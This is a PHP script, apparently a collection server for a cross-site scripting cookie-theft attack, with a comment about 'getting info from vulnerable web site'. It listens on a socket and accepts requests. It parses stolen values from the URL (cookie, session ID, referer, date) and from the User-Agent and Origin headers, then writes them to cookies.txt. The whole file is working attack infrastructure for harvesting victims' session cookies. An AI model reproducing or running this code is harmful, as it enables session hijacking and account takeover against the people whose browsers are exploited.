<?

$WS_PREFIX = "WS> ";
while(true){

try{
// set some variables
$host = "localhost";
/*****  GETTING INFO FROM VULNARABLE WEB SITE  ******/
$port = 6003;
echo "\n###########################\nlistening socket..\n";

set_time_limit(0); //no timeout

// create socket
$socket = socket_create(AF_INET, SOCK_STREAM, 0);
// bind socket to port
$result = socket_bind($socket, $host, $port);
// start listening for connections
$result = socket_listen($socket, 3);
// accept incoming connections

// spawn another socket to handle communication
$spawn = socket_accept($socket);

// read client input
$input = socket_read($spawn, 1024);
echo "\nWS: input from socket: \n";
echo $input;
$urlline = "";
$clientIPAddr = "";
$clientPort = "";
$browserInfo = "";
$clientOS = "";
$date = "";
echo $WS_PREFIX . "COOKIE AND URL INFO:\n";
foreach(preg_split("/((\r?\n)|(\r\n?))/", $input) as $line){
    if(strpos($line, 'GET /') !== false)
    {
       $urlline = $line;
    }
    else if(strpos($line, 'Host') !== false)
    {
        $clientPort = str_replace('Host: localhost:', '', $line);
        echo $WS_PREFIX . "client port: " . $clientPort . "\n";;
    }
    else if(strpos($line, 'User-Agent') !== false)
    {
        $browserInfo = $line;
        $clientOS = $line;
        echo $WS_PREFIX . "browser and os info: " . $browserInfo . "\n";;
    }
    else if(strpos($line, 'Origin') !== false)
    {
        $clientIPAddr = str_replace('Origin: ', '', $line);
        echo $WS_PREFIX . "client IP Address: " . $clientIPAddr . "\n";
    }
}
# parse url parameters by &
trim($urlline);
parse_str($urlline);
echo $WS_PREFIX . "session id: " . $sessionID . "\n";
echo $WS_PREFIX . "date: " . $date . "\n";
echo $WS_PREFIX . "cookie: " . $cookie . "\n";
echo $WS_PREFIX . "referer: " . $referer . "\n";
# Display info on a webpage
$myfile = fopen("cookies.txt", "w") or die("Unable to open file!");
fwrite($myfile, "td1==>");
fwrite($myfile, $clientIPAddr);
fwrite($myfile,"\n");
fwrite($myfile, "td2==>");
fwrite($myfile, $clientPort);
fwrite($myfile,"\n");
fwrite($myfile, "td3==>");
fwrite($myfile, $browserInfo);
fwrite($myfile,"\n");
fwrite($myfile, "td4==>");
fwrite($myfile, $clientOS);
fwrite($myfile,"\n");
fwrite($myfile, "td5==>");
fwrite($myfile, $referer);
fwrite($myfile,"\n");
fwrite($myfile, "td6==>");
fwrite($myfile, $sessionID);
fwrite($myfile,"\n");
fwrite($myfile, "td7==>");
fwrite($myfile, $cookie);
fwrite($myfile,"\n");
fwrite($myfile, "td8==>");
fwrite($myfile, $date);
fwrite($myfile,"\n");
fclose($myfile);

}catch(Exception $e){
  echo "error occured :" . $e;
  continue;
}
}
// close sockets
socket_close($spawn);
socket_close($socket);
?>